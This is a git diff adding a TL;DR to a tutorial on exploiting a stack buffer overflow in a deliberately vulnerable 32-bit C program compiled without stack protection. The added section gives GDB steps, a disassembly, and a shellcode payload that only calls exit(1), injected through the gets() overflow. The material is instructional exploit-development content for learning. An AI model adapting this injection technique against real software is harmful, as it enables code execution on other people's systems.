@@ -9,6 +9,74 @@ author:
 
 # Buffer overflow to exit
 
+## TL;DR
+
+Open GDB
+
+```sh
+gdb vuln
+```
+
+Run the program once
+
+```
+(gdb) run
+```
+
+Then exit (CTRL+C) and dissassemble the symbol `vuln`
+
+```
+(gdb) disassemble vuln
+Dump of assembler code for function vuln:
+   0x5655617d <+0>:     push    %ebp
+   0x5655617e <+1>:     mov     %esp,%ebp
+   0x56556180 <+3>:     sub     $0x8,%esp
+   0x56556183 <+6>:     lea     -0x8(%ebp),%eax
+   0x56556186 <+9>:     push    %eax
+   0x56556187 <+10>:    call    0xf7c741b0 <_IO_gets>
+   0x5655618c <+15>:    add     $0x4,%esp
+   0x5655618f <+18>:    nop
+   0x56556190 <+19>:    leave
+   0x56556191 <+20>:    ret
+End of assembler dump.
+```
+
+Add a breakpoint on the first instruction and run it once again
+
+```
+(gdb) break *0x5655617d
+Breakpoint 1 at 0x5655617d: file vuln.c, line 3.
+(gdb) run
+Breakpoint 1, vuln () at vuln.c:3
+3	void vuln() {
+```
+
+Print the address of the variable `buffer`
+
+```
+(gdb) print &buffer
+```
+
+Craft the exploit with the shellcode payload and memory address of the `buffer`
+
+```
+\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff
+```
+
+Execute the exploit inside GDB
+
+```
+(gdb) r <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
+```
+
+The program should terminate with the exit status code `1`
+
+```
+[Inferior 1 (process 1027954) exited with code 01]
+```
+
+---
+
 ## Introduction
 
 A vulnerable C source code is provided that accepts an unbounded number of non-null byte characters from standard input.
@@ -57,6 +125,13 @@ $ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z e
 - `-ggdb` generate debug information compatible with the GDB debugger.
 - `-fno-pie` disables position-independent executable (PIE) generation which randomizes the base address of the executable.
 - `-z execstack` sets the stack as executable.
+
+This compilation step is necessary otherwise it would almost be a bit harder to execute this type of buffer overflow.
+
+```
+*** stack smashing detected ***: terminated
+[1]    1024635 IOT instruction (core dumped)
+```
 
 ### Shellcode
 
